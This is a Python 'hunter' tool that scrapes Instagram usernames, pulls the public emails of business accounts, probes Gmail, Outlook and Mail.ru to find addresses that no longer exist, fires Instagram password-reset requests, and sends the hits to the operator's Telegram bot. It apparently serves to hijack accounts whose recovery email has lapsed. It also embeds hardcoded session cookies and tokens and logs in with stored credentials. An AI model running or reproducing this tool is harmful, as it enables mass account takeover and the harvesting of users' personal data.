import requests, os
import uuid, time
import secrets, string
import json, random
from time import sleep

num = 0
numch = 0
numcr = 0
print("""\033[0;31m

    )  (                *         )            )              (     
 ( /(  )\ )           (  `     ( /(         ( /(   *   )      )\ )  
 )\())(()/( (    (    )\))(    )\())    (   )\())` )  /( (   (()/(  
((_)\  /(_)))\   )\  ((_)()\  ((_)\     )\ ((_)\  ( )(_)))\   /(_)) 
 _((_)(_)) ((_) ((_) (_()((_)  _((_) _ ((_) _((_)(_(_())((_) (_))   
|_  / |_ _|| __|| __||  \/  | | || || | | || \| ||_   _|| __|| _ \  
 / /   | | | _| | _| | |\/| | | __ || |_| || .` |  | |  | _| |   /  
/___| |___||___||___||_|  |_| |_||_| \___/ |_|\_|  |_|  |___||_|_\  

[+] TooL By ZIEEM ; @_0UrU

""")
token = input('\n\033[0;32m[+] Your Token ; ')
id = input('[+] Your iD ; ')
slp = int(input('[+] Sleep ; '))
r = requests.Session()
uid = uuid.uuid4()
secret = secrets.token_hex(8) * 2
headers = {
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-Connection-Type': 'WIFI',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Host': 'i.instagram.com'}

cls = lambda: os.system('cls')
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    'Accept': "*/*", 'Host': 'www.instagram.com'}
user_list = open("list.txt", "w")
zieem = "qwertyuio×?plkj¥hgfdsazxcvbnm1234567890"
keyword = ("".join(random.choice(zieem) for i in range(4)))


def grab(sleep):
    global num
    try:
        for word in keyword:
            time.sleep(int(sleep))
            url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="
            response = requests.get(url + word + "&count=20000", headers=HEADERS).json()
            for index in response['users']:
                username = index['user']['username']
                num += 1
                print(username)
                user_list.write(f"{username}\n")
        user_list.close()
        cls()
        input(f"[!] Total Usernames : {num}")
    except Exception:
        print('[-] Error ==> ')


grab(slp)
os.system('clear')


def info(user):
    r_id = r.get(('https://i.instagram.com/api/v1/users/' + user + '/usernameinfo/'), headers=headers)
    if 'username' in r_id.text:
        idd = r_id.json()['user']['pk']
        url1 = 'https://i.instagram.com/api/v1/users/{}/info/'.format(str(idd))
        if r.get(url1, headers=headers).json()['user']['is_business'] == True:
            email = r.get(url1, headers=headers).json()['user']['public_email']
            requests.get(
                'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + id + '&text=' + f'[!] ZIEEM HUNTER\n[+] USER : {user}\n[+] EMAIL : {email}\n----------------------------------')
            print(f'[!] ZIEEM HUNTER\n[+] USER : {user}\n[+] EMAIL : {email}\n----------------------------------')


def rest(email, user):  # input("Enter email or username: ")
    resetheader = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-length': '62',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=DE98E92B-1C59-4577-B552-95B70702035D; mid=XmtzKAALAAFRRhfc9S4TwnSCw7I3; fbm_124024574287414=base_domain=.instagram.com; rur="VLL\05440147983799\0541630667408:01f7b1de0c5bf1d543514c0d61b2220078b2fc840d001dcc06ea964adfc9b24beb7580e0"; csrftoken=cto7ygvikPTzKjBdtlXKq4DXyUwwC1hL; fbsr_124024574287414=15qN-sMukrpJ6GIkZ8NmPnufiSkyr3M5d0GxnTWmA_o.eyJ1c2VyX2lkIjoiNTczMDE3NjM1IiwiY29kZSI6IkFRQlpFbkhKOGxxVVVQQ1lqNldYZS04NkRvT3E1UGhDMW0zX2Fyclh2aWh0ZHZibGFBbEZzNHViTUs4MWsxV21ic2VlOE8wMUJCNmZLVERyMW85SEQyWV9SQ1R3ZDQyazhCVndrdmNDdVp2WG1BQktsNm04SjY2RlVDaWU2TE9rYTVjTjRwV1RQZ3NpY0E5ZDVCWUdUOE4yM1VrWVVHV09GbjZNTDNaNF85c2tpb1J4WEtRS2l0dVFvQkJhNHNrc0M4V1VWRm5DcWtVX2pFLWdxZUJIUm9hZTY1eHpQUXVyVnpwQkRwZnoxOW9IQlAwbUZEV0l3eVo3OUhjSWxsLXI3aXJQNUNUSWpHUXI1aGp3cVJqRGdKQkhhZjRpVDY1Z2owMUViMkVpNjM3R3BXb0ZWYmE5TE5ocTVnSWt1T3dKTDdVIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtySHg0SUlJZ0ZWZ29aQWtpTVhNeG1VMTNKMHg5Z05hSkJXSGp1amVLWkNaQnRtNWN6b3U1T3VoTmlBa0tWeWZONXFwYVN6cUFjekZ4eE91VFhvc0tIdEhZY1pBalRXRHlPVVFVS0hDWkE3U21ZeTBXVmIwNmJWY2ZCYTZuU21tc1Z3SmF2bXZqcmF3QVpCMFZkWkFxNjlaQ09wZzYwaEdZNVpDWkFmbTBFcmRCIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE1OTkxMzcyMDZ9; urlgen="{\"37.236.160.31\": 50710}:1kDoe2:CdvaY9aoJRHpcB-R3gY2fJlMIwE"',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/password/reset/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
        'x-csrftoken': 'cto7ygvikPTzKjBdtlXKq4DXyUwwC1hL',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR2hh8dmd24UZFienLyuIYPWEL5YBk06UBp1LJr_G5d2kAla',
        'x-instagram-ajax': 'bed5f8ccef28',
        'x-requested-with': 'XMLHttpRequest'
    }
    reseturl = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
    data = {
        'email_or_username': email
    }
    reqreset = requests.post(reseturl, data=data, headers=resetheader).text
    if '"email_or_sms_sent": true' or "We couldn't reach your email address. Please try resetting your password using a different option, or contact support" or "Sorry, we can't send you a link to reset your password. Please contact Instagram for help." in reqreset:
        print('TM')
        info(user)
        return True
    else:
        return False


def checkHotmail(email, user):
    aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
    payload = ''
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "Connection": "close",
        "Host": "odc.officeapps.live.com",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
        "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
        "uaid": "d06e1498e7ed4def9078bd46883f187b",
        "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
    }
    response = requests.get(aaa, data=payload, headers=headers)
    if 'MSAccount' in response.text:
        return
    elif "Neither" in response.text:
        print('not')
        rest(email, user)


def checkgmail(email, user):
    url = "https://mmo69.com/_check_live_email/api.php?email=" + email
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ar",
        "Connection": "keep-alive",
        "Host": "mmo69.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
    }
    data = {"email": email}
    rr = requests.get(url, headers=headers, data=data)
    if rr.text.find("LIVE") >= 0:
        return
    else:
        rest(email, user)


def checkMailru(email, user):
    url = 'https://account.mail.ru/api/v1/user/exists'
    data = {'email': email}
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
    js = requests.post(url, data=data, headers=headers)
    if str(js.json()['body']['exists']) == 'False':
        rest(email, user)
    else:
        print('no')


ali = 1


def working(user):
    try:
        r_id = r.get(('https://i.instagram.com/api/v1/users/' + user + '/usernameinfo/'), headers=headers)
        if 'username' in r_id.text:
            idd = r_id.json()['user']['pk']
            url1 = 'https://i.instagram.com/api/v1/users/{}/info/'.format(str(idd))
            if r.get(url1, headers=headers).json()['user']['is_business'] == True:
                email = r.get(url1, headers=headers).json()['user']['public_email']
                if '@gmail.com' in str(email):
                    checkgmail(email, user)
                elif '@hotmail.com' or '@outlook.com' in str(email):
                    checkHotmail(email, user)
                elif '@mail.ru' in email:
                    print('is')
                    checkMailru(email, user)
    except:
        print(f'Done Checked [ {ali} ]')


us_ps = open('Account.txt', 'r').read().splitlines()
username = us_ps[0].split(':')[0]
password = us_ps[0].split(':')[1]


def generateUUID(type):
    generated_uuid = str(uuid.uuid4())
    if (type):
        return generated_uuid
    else:
        return generated_uuid.replace('-', '')


url = "https://b.i.instagram.com/api/v1/accounts/login/"
hedlog = {
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US",
    "X-IG-Capabilities": "3brTvw==",
    "X-IG-Connection-Type": "WIFI",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    'Host': 'i.instagram.com',
    'Connection': 'keep-alive'
}
datalog = {
    'uuid': uid,
    'password': password,
    'username': username,
    'device_id': uid,
    'from_reg': 'false',
    '_csrftoken': 'missing',
    'login_attempt_countn': '0'
}
re = requests.post(url, data=datalog, headers=hedlog).text
if '"bad_password"' in re:
    print("Error Pass")
elif '"invalid_user' in re:
    print("Error Username")
elif '"logged_in_user"' in re:
    print("Done Login")
else:
    print("False Login")
opn = open('list.txt', 'r').read().splitlines()
for i in opn:
    working(i)
    print(f'Done Checked [ {ali} ]')
    ali += 1
    sleep(slp)
